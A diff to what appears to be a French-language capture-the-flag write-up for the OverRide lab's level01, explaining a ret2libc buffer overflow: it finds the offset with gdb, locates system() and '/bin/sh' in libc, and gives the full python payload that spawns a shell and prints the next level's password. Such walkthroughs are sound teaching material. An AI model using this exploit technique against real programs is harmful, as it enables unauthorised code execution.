@@ -160,3 +160,67 @@ admin
 nope, incorrect password...
 ```
 Quel que soit le mot de passe, il affiche "nope, incorrect password..." et return, puis de toutes façons à aucun moment il ne nous affiche le fichier .pass ou nous ouvre un shell, donc on va devoir se débrouiller tout seul.
+
+A la différence de RainFall, OverRide nous propose une iso avec un protection sur la stack: celle-ci est [non-exécutable](https://www.usenix.org/legacy/publications/library/proceedings/sec98/full_papers/full_papers/cowan/cowan_html/node21.html):
+```
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   /home/users/level00/level00
+```
+
+Comme nous ne pouvons plus exécuter le shellcode situé sur la stack, nous allons changer notre technique, et nous allons appeler directement la fonction system() de la libc, en lui fournissant comme argument la chaine de caractère "/bin/sh".<br/>
+doc principale : https://beta.hackndo.com/retour-a-la-libc/<br/>
+
+Tout d'abord, on note que fgets() est utilisé sans protection sur un buffer à <main+164>. On peut donc faire un buffer overflow, cherchons l'offset avec un [générateur de pattern](https://wiremask.eu/tools/buffer-overflow-pattern-generator/).
+
+```
+(gdb) r
+Starting program: /home/users/level01/level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: dat_wil
+verifying username....
+
+Enter Password:
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+nope, incorrect password...
+
+
+Program received signal SIGSEGV, Segmentation fault.
+0x37634136 in ?? ()
+```
+- L'EIP est réécrit avec un offset de 80. 
+
+Notre exploit sera composé comme suit:
+[ Offset de 80 (NopSled) ] [ Adresse system() ] [ Adresse retour (osef) ] [ Adresse "/bin/sh" ].
+
+```
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+```
+- L'adresse de system() est 0xf7e6aed0 (\xd0\xae\xe6\xf7)
+
+```
+(gdb) find __libc_start_main,+99999999,"/bin/sh"
+0xf7f897ec
+warning: Unable to access target memory at 0xf7fd3b74, halting search.
+1 pattern found.
+```
+Cette commande recherche dans une plage mémoire commençant au début de la fonction __libc_start_main() (appelée avant notre fonction main), et d’une taille de 99 999 999 octets la string "/bin/sh".
+- L'adresse de "/bin/sh" est 0xf7f897ec (\xec\x97\xf8\xf7)
+
+`(python -c 'print "dat_wil\n" + "\x90" * 80 + "\xd0\xae\xe6\xf7" + "OSEF" + "\xec\x97\xf8\xf7"'; cat - ) | ./level01`
+```
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password:
+nope, incorrect password...
+
+whoami
+level02
+cat /home/users/level02/.pass
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
+/bin/sh: 3: �: not found
+Segmentation fault (core dumped)
+```
+
+
